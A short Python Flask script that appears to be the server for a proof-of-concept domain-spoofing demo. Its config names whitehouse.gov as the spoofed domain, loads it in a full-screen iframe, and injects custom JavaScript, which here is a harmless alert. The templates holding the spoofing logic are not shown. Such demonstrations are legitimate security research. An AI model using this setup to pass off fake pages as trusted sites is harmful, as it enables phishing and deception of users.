#!/usr/bin/env python2.7
from flask import Flask, render_template

### Config
vuln_url = 'http://127.0.0.1:5000/vulnerable.html'              # Vulnerable Page
spoof_page_domain = 'whitehouse.gov'                            # Domain Name of Spoof Page example.com
spoof_page_full_url = 'http://whitehouse.gov'                   # Full Screen iframe URL
spoof_page_title = 'The White House'                            # Page Title Name
custom_js = 'alert("I control the content here")'               # Custom Javascript
## End of Config

app = Flask(__name__, static_url_path='', static_folder='web/static', template_folder='web/templates')

@app.route('/')
def index():
    return render_template('index.html', vuln_url=vuln_url)

@app.route('/index2.html')
def login():
    return render_template('index2.html', spoof_page_domain=spoof_page_domain, spoof_page_full_url = spoof_page_full_url, spoof_page_title=spoof_page_title, custom_js=custom_js) 

if __name__ == '__main__':
    try:
            app.run(host= '127.0.0.1', port=5000, debug=False)
    except Exception, e:
        print str(e)
